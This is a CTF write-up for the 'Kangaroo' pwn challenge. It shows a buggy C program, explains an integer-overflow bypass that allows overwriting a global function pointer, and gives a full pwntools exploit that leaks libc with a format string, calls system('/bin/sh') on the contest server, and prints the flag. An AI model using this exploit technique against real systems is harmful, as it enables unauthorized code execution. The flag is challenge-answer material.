# Kangaroo : Pwn

The word kangaroo derives from the Guugu Yimithirr word gangurru, referring to eastern grey kangaroos.

Attachment  
[kangaroo.tar.gz](kangaroo.tar.gz)  

Tags : Integer Overflow, Out-Of-Bounds Read, Out-Of-Bounds Write, Grobal Buffer Overflow, Libc Leak, Function Pointer  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define SLOT 8
#define SIZE 0x48

char g_messages[SLOT*SIZE];
void (*fn_clear)(void*, size_t);

static void clear_message(void *buf, size_t len) {
  memset(buf, 0, len);
}

off_t get_offset(const char *s) {
  off_t offset;
  ssize_t index;

  printf("%s", s);
  if (scanf("%ld", &index) != 1)
    exit(1);

  if (index >= LLONG_MAX / SIZE) {
    puts("[-] Integer overflow");
    exit(1);
  }

  offset = index * SIZE;
  if (offset < 0 || offset >= sizeof(g_messages)) {
    puts("[-] Invalid offset");
    exit(1);
  }

  return offset;
}

void read_line(const char *s, char *buf, size_t n) {
  printf("%s", s);
  for (size_t i = 0; i < n; i++) {
    if (read(0, buf + i, 1) != 1) exit(1);
    if (buf[i] == '\n') {
      buf[i] = '\0';
      break;
    }
  }
}

int main() {
  off_t offset;
  int choice;

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  fn_clear = clear_message;

  puts("1. Read\n2. Write\n3. Clear");
  while (1) {
    printf("> ");
    if (scanf("%d", &choice) != 1)
      break;

    switch (choice) {
      case 1: // Read
        offset = get_offset("Index: ");
        read_line("Message: ", g_messages + offset, SIZE);
        break;

      case 2: // Write
        offset = get_offset("Index: ");
        printf("Message: %s\n", g_messages + offset);
        break;

      case 3: // Clear
        fn_clear(g_messages, sizeof(g_messages));
        break;

      default:
        return 0;
    }
    
  }
  return 0;
}
```
Since the size check is lax, we can specify the arbitrary offset to overwrite using an integer overflow.
```
$ checksec kangaroo
[*] '/home/colza/kangaroo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

The apploach is as follows:
* By overwriting `fn_clear` with an arbitrary function pointer, call any function.
* Overwriting `fn_clear` with `printf` causes a libc leak in FSB.
* Overwriting `fn_clear` with `system('/bin/sh')`
* Calling `fn_clear` trigger calling an arbitrary function.

Since `g_message` and `fn_clear` are adjacent, the offset is 0x240.  
Since it will pass the size check if it is smaller than 0x240, so aim for 0x238.  
The negative number that, when multiplied by 0x48, equals 0x238 is `-1024819115206086193`.

The offset of the libc function when calling `printf` is `9`.
```
 ► 0x4013ea <main+245>    call   rax                         <clear_message>
        rdi: 0x404080 (g_messages) ◂— 0
        rsi: 0x240
        rdx: 0
        rcx: 0

   0x4013ec <main+247>    jmp    main+256                    <main+256>
    ↓
   0x4013f5 <main+256>    jmp    main+69                     <main+69>
    ↓
   0x40133a <main+69>     mov    edi, 0x40204d     EDI => 0x40204d ◂— 0x6e4900642500203e /* '> ' */
   0x40133f <main+74>     mov    eax, 0            EAX => 0
   0x401344 <main+79>     call   printf@plt                  <printf@plt>

   0x401349 <main+84>     lea    rax, [rbp - 0xc]
   0x40134d <main+88>     mov    rsi, rax
   0x401350 <main+91>     mov    edi, 0x402050        EDI => 0x402050 ◂— 0x7865646e49006425 /* '%d' */
   0x401355 <main+96>     mov    eax, 0               EAX => 0
   0x40135a <main+101>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdbd0 ◂— 0x3ffffdcc0
01:0008│-008 0x7fffffffdbd8 —▸ 0x7fffffffdd08 —▸ 0x7fffffffdfc0 ◂— '/home/colza/kangaroo'
02:0010│ rbp 0x7fffffffdbe0 —▸ 0x7fffffffdc80 —▸ 0x7fffffffdce0 ◂— 0
03:0018│+008 0x7fffffffdbe8 —▸ 0x7ffff7dd31ca ◂— mov edi, eax
```
`0x7ffff7dd31ca ◂— mov edi, eax` is located at `__libc_init_first+138`.

The steps are as follows:
 * overwrite `fn_clear` with `printf` plt address
 * write format string for leaking libc base address to `g_message`
 * call the overwritten `fn_clear`
 * calculate the libc base address
 * overwrite `fn_celar` with `system` address
 * write `/bin/sh` to `g_message`
 * call the overwritten `fn_clear` and get the flag

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./kangaroo")
libc = ELF("./libc.so.6")

context.arch = 'amd64'

p = remote("34.170.146.252", 64357)

def read(index, message):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Message: ", message)

def write(index):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"Index; ", str(index).encode())
    p.recvuntil(b"Message: ")

def clear():
    p.sendlineafter(b"> ", b"3")

printf_plt_addr = elf.plt['printf']
log.info(hex(printf_plt_addr))
fn_clear_index = -1024819115206086193

libc_leak_payload = b"a"*0x8 + p64(printf_plt_addr)
read(fn_clear_index, libc_leak_payload)
read(0, b"%9$p")
clear()

p.recvuntil(b"0x")
libc_init_first_offset = libc.symbols['__libc_init_first']
libc.address = int(p.recvuntil(b"a"), 16) - libc_init_first_offset - 138
log.info(hex(libc.address))

system_addr = libc.symbols['system']
shell_payload = b"a"*0x8 + p64(system_addr)
read(fn_clear_index, shell_payload)
read(0, b"/bin/sh")
clear()

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/kangaroo'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[*] '/home/colza/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to 34.170.146.252 on port 64357: Done
[*] 0x401050
[*] 0x7f43376f8000
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag-e9e0d45ed3c58df0dc0ba1107060614f.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag*
Alpaca{Ch3cK-4f7Er-buG_1s_m34n1NgL3s5}
$ exit
> $ 3
[*] Got EOF while reading in interactive
$
[*] Closed connection to 34.170.146.252 port 64357
[*] Got EOF while sending in interactive
```

Got the flag!

`Alpaca{Ch3cK-4f7Er-buG_1s_m34n1NgL3s5}`
